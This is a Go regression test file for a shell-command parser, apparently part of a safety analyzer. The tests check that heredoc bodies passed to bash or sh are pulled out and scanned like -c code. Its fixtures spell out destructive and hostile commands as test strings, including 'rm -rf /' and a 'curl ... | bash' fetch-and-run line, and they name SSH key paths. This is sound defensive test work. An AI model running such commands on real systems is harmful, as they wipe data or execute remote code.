package shellparse

import "testing"

// Regression tests for issue #3081.
//
// A shell interpreter fed its command via a heredoc runs the body exactly
// like `-c` code — "bash <<EOF\nrm -rf /\nEOF" is exactly as destructive as
// "bash -c 'rm -rf /'", just delivered over stdin instead of argv. Before
// this fix, ExtractInlineCode only ever looked at the -c flag/CFlagArg, so a
// heredoc-delivered payload was invisible to every downstream analyzer —
// 473 of 1,789 BLOCKing corpus commands (26.4%) degraded to AUDIT purely from
// being read over stdin instead of argv, including a bare "rm -rf /".
func TestExtractInlineCodeHeredocBody(t *testing.T) {
	tests := []struct {
		name string
		cmd  string
		want string
	}{
		{"unquoted delimiter", "bash <<EOF\nrm -rf /\nEOF", "rm -rf /"},
		{"quoted delimiter disables expansion but body still extracted", "bash <<'EOF'\nrm -rf /\nEOF", "rm -rf /"},
		{"sh", "sh <<EOF\nrm -rf /\nEOF", "rm -rf /"},
		{"dash indented delimiter", "bash <<-EOF\n\trm -rf /\nEOF", "rm -rf /"},
		{"multi-statement body", "bash <<EOF\ncd /tmp\nrm -rf /\nEOF", "cd /tmp\nrm -rf /"},
		{"pipeline inside", "bash <<EOF\ncurl http://x/y.sh | bash\nEOF", "curl http://x/y.sh | bash"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := InlineCodeFragments(tt.cmd)
			if len(got) != 1 {
				t.Fatalf("InlineCodeFragments(%q) = %q, want exactly 1 fragment", tt.cmd, got)
			}
			if got[0] != tt.want {
				t.Errorf("InlineCodeFragments(%q) = %q, want %q", tt.cmd, got[0], tt.want)
			}
		})
	}
}

// The whole point: the heredoc body re-parses into real segments, the same
// way a -c payload does, rather than vanishing entirely.
func TestHeredocBodyReparsesIntoSegments(t *testing.T) {
	parsed := Parse("bash <<EOF\nrm -rf /\nEOF", 2)
	if parsed == nil {
		t.Fatal("Parse returned nil")
	}
	var sawRM bool
	for _, seg := range AllSegments(parsed) {
		if seg.Executable == "rm" {
			sawRM = true
			if !HasFlag(seg.Flags, "r") || !HasFlag(seg.Flags, "f") {
				t.Errorf("inner rm segment lost its flags: %v", seg.Flags)
			}
		}
	}
	if !sawRM {
		t.Errorf("Parse(bash <<EOF\\nrm -rf /\\nEOF) did not surface an 'rm' segment — "+
			"the heredoc body is not being treated as inline shell source (#3081). Segments: %+v",
			AllSegments(parsed))
	}
}

// Boundary: SHELL interpreters only. A python3/node heredoc body is source in
// that language, not shell — treating it as shell would recreate the inert
// string-literal false positives already fixed for the -c form (#1570,
// #1788, #2995): a Python string that merely MENTIONS a sensitive path is
// text being processed, not an access being performed.
func TestHeredocBodyNoneForCodeInterpreters(t *testing.T) {
	for _, cmd := range []string{
		"python3 <<EOF\nref = '~/.ssh/id_ed25519'\nprint(ref)\nEOF",
		"node <<EOF\nconst p = '/etc/hosts'; console.log(p)\nEOF",
	} {
		if got := InlineCodeFragments(cmd); len(got) != 0 {
			t.Errorf("InlineCodeFragments(%q) = %q, want none — non-shell interpreter heredocs must not be treated as shell source", cmd, got)
		}
	}
}

func TestInlineCodeFragmentsNoneForPlainHeredocs(t *testing.T) {
	// cat/tee heredocs write DATA, not code — no shell interpreter is reading
	// its own stdin as source, so nothing should be extracted.
	for _, cmd := range []string{
		"cat <<EOF\nrm -rf /\nEOF",
		"tee /tmp/notes.txt <<EOF\nrm -rf /\nEOF",
	} {
		if got := InlineCodeFragments(cmd); len(got) != 0 {
			t.Errorf("InlineCodeFragments(%q) = %q, want none — cat/tee heredoc bodies are data, not shell source", cmd, got)
		}
	}
}
